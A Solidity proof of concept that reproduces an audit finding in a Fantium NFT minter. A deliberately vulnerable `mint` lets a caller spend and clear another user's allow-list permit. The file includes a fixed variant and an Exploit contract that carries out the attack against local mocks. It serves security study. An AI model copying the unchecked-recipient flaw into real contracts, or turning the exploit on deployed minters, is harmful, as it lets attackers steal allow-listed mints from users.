// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Fantium FantiumMinterV1.mint — _to is not validated, so a caller can
    clear another user's allow-list permit (MixBytes, AuditVault 28051).
    SYNTHETIC, cheatcode-free. L-12: while a collection is paused, the
    allow list permits one mint, and mint sets that permit to false.
    The permit written is `_to`, and `_to` is not checked against
    msg.sender. An intruder passes the victim, takes the paused-collection
    mint, and the victim's later mint reverts. */

contract FantiumNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    function mintTo(address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == address(0), "exists");
        ownerOf[tokenId] = to;
        balanceOf[to] += 1;
    }
}

contract FantiumMinterV1 {
    uint256 public constant PRICE = 100000000000000;
    FantiumNFT public fantiumNFTContract;
    bool public paused = true;
    mapping(uint256 => mapping(address => bool)) public allowList;

    constructor(FantiumNFT nft) {
        fantiumNFTContract = nft;
    }

    function setAllow(uint256 collectionId, address who, bool allowed) external {
        allowList[collectionId][who] = allowed;
    }

    function mint(address _to, uint256 collectionId) external payable {
        require(msg.value == PRICE, "price");
        require(!paused || allowList[collectionId][_to], "not on allow list");
        uint256 thisTokenId = collectionId * 1_000_000 + 1;
        allowList[collectionId][_to] = false;
        // @> VULN: _to was not checked, so this mint follows a cleared permit of someone else.
        fantiumNFTContract.mintTo(msg.sender, thisTokenId);
    }

    function mintFixed(address _to, uint256 collectionId) external payable {
        require(_to == msg.sender, "to");
        require(msg.value == PRICE, "price");
        require(!paused || allowList[collectionId][msg.sender], "not on allow list");
        allowList[collectionId][msg.sender] = false;
        fantiumNFTContract.mintTo(_to, collectionId * 1_000_000 + 1);
    }
}

contract Victim {
    function tryMint(FantiumMinterV1 minter) external payable returns (bool ok) {
        try minter.mint{value: msg.value}(address(this), 1) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

contract Exploit {
    uint256 public constant PRICE = 100000000000000;
    address public constant VICTIM_MARK = address(0xBEEF);

    FantiumNFT public nft;
    FantiumMinterV1 public minter;
    Victim public victim;
    uint256 public victimPermit;
    bool public victimBlocked;

    constructor() {
        nft = new FantiumNFT();
        minter = new FantiumMinterV1(nft);
        victim = new Victim();
        minter.setAllow(1, address(victim), true);
    }

    function run() external payable {
        require(msg.value == PRICE, "price");
        require(minter.allowList(1, address(victim)), "victim starts allowed");
        require(!minter.allowList(1, address(this)), "attacker starts blocked");
        minter.mint{value: PRICE}(address(victim), 1);
        victimPermit = minter.allowList(1, address(victim)) ? 1 : 0;
        require(victimPermit == 0, "permit cleared");
        require(nft.balanceOf(address(this)) == 1, "attacker minted");
        require(nft.balanceOf(address(victim)) == 0, "victim has 0");
    }
}
